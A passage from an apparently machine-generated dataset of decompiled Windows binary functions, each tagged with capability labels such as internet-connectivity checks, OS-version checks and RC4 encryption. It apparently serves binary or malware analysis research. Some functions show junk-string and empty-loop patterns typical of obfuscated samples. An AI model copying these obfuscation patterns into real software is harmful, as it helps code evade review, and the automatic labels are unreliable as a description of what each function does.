            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405cd1(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x451580;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"splqmaanzeiygdvaaivvdirxcqlgwfsyynzcikuceihjyfcniefcxxducnjhcyrxjhfcldwbakkhk\");\n    var_10h = 2;\n    fcn.00401e79(\"rlzeixzbrwkehjchobjkazd\");\n    for (var_64h = 0x43; 0 < var_64h; var_64h = var_64h + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x7d64;\n}\n",
        "token_count": 341
    },
    "00405d0d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405d0d(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 348
    },
    "00405d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405d30(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004038a0(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 352
    },
    "00405d71": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d71(code **arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code **arg_8h_00;\n    int32_t *in_ECX;\n    \n    if ((*(in_ECX + 1) < '\\x02') && (0 < arg_8h[1])) {\n        if (*in_ECX == 0) {\n            fcn.004022f7(arg_8h);\n        }\n        else {\n            arg_8h_00 = fcn.0040528b(0xc);\n            if (arg_8h_00 == NULL) {\n                arg_8h_00 = NULL;\n            }\n            else {\n                pcVar1 = arg_8h[1];\n                pcVar2 = *arg_8h;\n                *arg_8h_00 = vtable.pcharNode.0;\n                arg_8h_00[1] = pcVar2;\n                arg_8h_00[2] = pcVar1;\n            }\n            fcn.004030ee(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00405d80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: lpCPInfo\n\nvoid __cdecl fcn.00405d80(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint8_t *puVar8;\n    uint uVar9;\n    ushort *puVar10;\n    ushort *puVar11;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar12;\n    int32_t var_20h;\n    uint8_t *var_1ch;\n    int32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar4 = fcn.004c7d9d(arg_8h);\n    if (uVar4 != 0) {\n        uVar12 = 0;\n        uVar5 = 0;\n        var_1ch = NULL;\ncode_r0x004c83f3:\n        if (*(uVar5 + 0x5724b0) != uVar4) goto code_r0x004c83ff;\n        fcn.00403189(arg_ch + 0x18, 0, 0x101);\n        var_20h = var_1ch * 0x30;\n        var_1ch = var_20h + 0x5724c0;\n        do {\n            uVar2 = *var_1ch;\n            puVar8 = var_1ch;\n            while ((uVar2 != 0 && (uVar2 = puVar8[1],  uVar2 != 0))) {\n                for (uVar5 = *puVar8; (uVar5 <= uVar2 && (uVar5 < 0x100)); uVar5 = uVar5 + 1) {\n                    puVar1 = arg_ch + 0x19 + uVar5;\n                    *puVar1 = *puVar1 | *(uVar12 + 0x5724ac);\n                    uVar2 = puVar8[1];\n                }\n                puVar8 = puVar8 + 2;\n                uVar2 = *puVar8;\n            }\n            uVar12 = uVar12 + 1;\n            var_1ch = var_1ch + 8;\n        } while (uVar12 < 4);\n        *(arg_ch + 4) = uVar4;\n        *(arg_ch + 8) = 1;\n        uVar9 = fcn.004c7d4a(uVar4);\n        *(arg_ch + 0x21c) = uVar9;\n        puVar10 = arg_ch + 0xc;\n        puVar11 = var_20h + 0x5724b4;\n        iVar6 = 6;\n        do {\n            uVar3 = *puVar11;\n            puVar11 = puVar11 + 1;\n            *puVar10 = uVar3;\n            puVar10 = puVar10 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        goto code_r0x004c844f;\n    }\ncode_r0x004c859a:\n    fcn.004c7e59(arg_ch);\ncode_r0x004c85a3:\n    fcn.004030bc(var_20h);\n    return;\ncode_r0x004c83ff:\n    var_1ch = var_1ch + 1;\n    uVar5 = uVar5 + 0x30;\n    if (0xef < uVar5) goto code_r0x004c840d;\n    goto code_r0x004c83f3;\ncode_r0x004c840d:\n    if ((uVar4 == 65000) || (iVar6 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(uVar4 & 0xffff),  iVar6 == 0))\n    goto code_r0x004c85a3;\n    if (uVar4 == 0xfde9) {\n        *(arg_ch + 4) = 0xfde9;\n        *(arg_ch + 0x21c) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar4, &lpCPInfo);\n        if (iVar6 == 0) {\n            if (*0x5754a4 == 0) goto code_r0x004c85a3;\n            goto code_r0x004c859a;\n        }\n        fcn.00403189(arg_ch + 0x18, 0, 0x101);\n        *(arg_ch + 4) = uVar4;\n        *(arg_ch + 0x21c) = 0;\n        if (lpCPInfo == 2) {\n            puVar7 = &var_12h;\n            while ((var_12h != 0 && (uVar2 = *(puVar7 + 1),  uVar2 != 0))) {\n                for (uVar4 = *puVar7; uVar4 <= uVar2; uVar4 = uVar4 + 1) {\n                    puVar8 = arg_ch + 0x19 + uVar4;\n                    *puVar8 = *puVar8 | 4;\n                }\n                puVar7 = puVar7 + 2;\n                var_12h._0_1_ = *puVar7;\n            }\n            puVar8 = arg_ch + 0x1a;\n            iVar6 = 0xfe;\n            do {\n                *puVar8 = *puVar8 | 8;\n                puVar8 = puVar8 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            uVar9 = fcn.004c7d4a(*(arg_ch + 4));\n            *(arg_ch + 0x21c) = uVar9;\n            uVar12 = 1;\n        }\n    }\n    *(arg_ch + 8) = uVar12;\n    *(arg_ch + 0xc) = 0;\n    *(arg_ch + 0x10) = 0;\n    *(arg_ch + 0x14) = 0;\ncode_r0x004c844f:\n    fcn.004c7ed7(arg_ch, unaff_EDI, unaff_ESI, unaff_EBX, var_20h, var_1ch, lpCPInfo);\n    goto code_r0x004c85a3;\n}\n",
        "token_count": 1552
    },
    "00405d8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405d8a(uint noname_0, uint arg_ch)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_3ch;\n    uint in_stack_ffffffd0;\n    uint var_4h;\n    \n    fcn.00405434();\n    uVar2 = fcn.00401357();\n    *(unaff_EBP + -0x6c) = uVar2;\n    puVar3 = fcn.0040273e(unaff_EBP + -0x68);\n    *(unaff_EBP + -0x70) = extraout_ECX;\n    puVar5 = unaff_EBP + -0x3c;\n    for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0040273e(unaff_EBP + -0x68);\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        uVar2 = *(*(unaff_EBP + -0x6c) + 8);\n    }\n    else {\n        uVar2 = 0x552647;\n    }\n    uVar2 = fcn.00401cc1(uVar2, 0, unaff_EBP + -0x68);\n    *(extraout_ECX + 8) = uVar2;\n    uVar2 = fcn.004030a3(\"false\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x10) = uVar2;\n    uVar2 = fcn.004030a3(\"true\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x14) = uVar2;\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        uVar2 = *(unaff_EBP + -0x6c);\n        puVar3 = unaff_EBP + -0x3c;\n        puVar5 = &stack0xffffffd0;\n        for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        fcn.00405a60(0, uVar2, in_stack_ffffffd0);\n    }\n    else {\n        uVar1 = fcn.00405015(0x2e, 0, unaff_EBP + -0x3c);\n        *(extraout_ECX + 0xc) = uVar1;\n        uVar1 = fcn.00405015(0x2c, 0, unaff_EBP + -0x3c);\n        *(extraout_ECX + 0xe) = uVar1;\n    }\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 823
    },
    "00405d9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405d9e(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t *var_4h;\n    \n    if (*0x57504c == 0) {\n        if (arg_8h + 1U < 0x101) {\n            return *(*0x571e78 + arg_8h * 2) & 8;\n        }\n    }\n    else {\n        arg_8h_00 = fcn.004043ef();\n        var_4h = *(arg_8h_00 + 0x4c);\n        fcn.0040449e(arg_8h_00, &var_4h);\n        if (arg_8h + 1U < 0x101) {\n            return *(*var_4h + arg_8h * 2) & 8;\n        }\n        if (1 < var_4h[1]) {\n            uVar1 = fcn.0040433b(arg_8h, 8, 0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 260
    },
    "00405dad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00405dad(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_18h;\n    uint32_t uVar3;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uchar var_4h;\n    uchar var_3h;\n    uint var_2h;\n    \n    if (arg_8h == 0xffffffff) {\n        return 0xffffffff;\n    }\n    fcn.004058a8(arg_ch);\n    if (arg_8h < 0x100) {\n        uVar3 = *(*(var_18h + 0x98) + (arg_8h & 0xff));\n        if (var_10h == '\\0') {\n            return uVar3;\n        }\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        return uVar3;\n    }\n    var_2h._0_1_ = 0;\n    if (1 < *(var_18h + 4)) {\n        var_ch = arg_8h >> 8;\n        iVar1 = fcn.00405a24(var_ch & 0xff, &var_18h);\n        if (iVar1 != 0) {\n            var_2h._0_1_ = 0;\n            arg_18h = 2;\n            var_4h = var_ch;\n            var_3h = arg_8h;\n            goto code_r0x004bf612;\n        }\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0x2a;\n    arg_18h = 1;\n    var_3h = 0;\n    var_4h = arg_8h;\ncode_r0x004bf612:\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    iVar1 = fcn.00405e70(&var_18h, *(var_18h + 0xa8), 0x200, &var_4h, arg_18h, &var_8h, 3, *(var_18h + 8), 1);\n    if (iVar1 != 0) {\n        arg_8h = var_8h;\n        if (iVar1 != 1) {\n            arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n        }\n    }\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return arg_8h;\n}\n",
        "token_count": 669
    },
    "00405de4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405de4(int32_t *arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x573bf0);\n    do {\n        if (*arg_8h == 0) {\n            *arg_8h = -1;\ncode_r0x0046165c:\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x573bf0);\n            return;\n        }\n        if (*arg_8h != -1) {\n            *(*(*(in_FS_OFFSET + 0x2c) + *0x573be4 * 4) + 0x104) = *0x571c90;\n            goto code_r0x0046165c;\n        }\n        fcn.0040545c(100);\n    } while( true );\n}\n",
        "token_count": 187
    },
    "00405df8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405df8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x3c) == '\\0') && (iVar2 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar1 = fcn.0040105a(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar1 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            fcn.004016ae(var_4h, param_1 + 0x18);\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00402978(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 318
    },
    "00405e02": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405e02(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00405e11": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405e11(uint16_t *arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x57504c == 0) {\n        if ((arg_8h == NULL) || (arg_ch == NULL)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            iVar2 = 0x7fffffff;\n        }\n        else {\n            if (arg_10h < 0x80000000) {\n                if (arg_10h != 0) {\n                    do {\n                        uVar3 = *arg_8h;\n                        if (uVar3 - 0x41 < 0x1a) {\n                            uVar3 = uVar3 + 0x20;\n                        }\n                        uVar4 = *arg_ch;\n                        arg_8h = arg_8h + 1;\n                        if (uVar4 - 0x41 < 0x1a) {\n                            uVar4 = uVar4 + 0x20;\n                        }\n                        arg_ch = arg_ch + 1;\n                    } while (((uVar3 - uVar4 == 0) && (uVar3 != 0)) && (arg_10h = arg_10h - 1,  arg_10h != 0));\n                    return uVar3 - uVar4;\n                }\n                return 0;\n            }\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            iVar2 = 0x7fffffff;\n        }\n    }\n    else {\n        iVar2 = fcn.0040513c(arg_8h, arg_ch, arg_10h, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 443
    },
    "00405e1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405e1b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x4518a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"ddtbwktwwxktuzxlivjjjmbckxpogyldxlrspaieopfqnrpucmwvfurnycfsnlafdgsxvthpmisawzzflkab\");\n    for (var_40h = 9; 0 < var_40h; var_40h = var_40h + -1) {\n    }\n    var_10h = 0;\n    fcn.00401e79(\"iqmknudorx\");\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 296
    },
    "00405e2a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405e2a(int32_t *param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4270e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if (*param_1 != 0) {\n        var_10h = 0;\n        fcn.00404179(*param_1);\n    }\n    *param_1 = 0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 170
    },
    "00421c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421c90(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402a72();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 95
    },
    "00405e5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00405e5c(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x44ff80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(0x5478e6);\n    uStack24 = 3;\n    fcn.00401e79(\"ckkykbama\");\n    uStack24 = 4;\n    fcn.00401e79(\"qdymdusgijuetlvmvlqlluzhuehiynmuycrcwkcthvqlcpuqbdvnofdnbhwaspdtxuscnaymqnaglfukxvixfkvxgtgaxqori\");\n    for (iStack140 = 0x56; 0 < iStack140; iStack140 = iStack140 + -1) {\n    }\n    for (iStack144 = 0x10; 0 < iStack144; iStack144 = iStack144 + -1) {\n    }\n    uStack24 = 5;\n    fcn.00401e79(0x54796a);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 410
    },
    "00405e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00405e70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004058a8(arg_8h);\n    fcn.004d4e3f(&var_ch, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "00405ed9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405ed9(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack152;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4506c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"lqbvjbgraq\");\n    uStack24 = 4;\n    fcn.00401e79(\"juefahcqoeioobubajwmqzbahozynekcdhtw\");\n    uStack24 = 5;\n    fcn.00401e79(0x54ac96);\n    for (iStack152 = 0x33; 0 < iStack152; iStack152 = iStack152 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x136d7;\n}\n",
        "token_count": 310
    },
    "00405ee3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405ee3(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        uVar2 = fcn.00405fec(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x32), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 196
    },
    "00405f01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
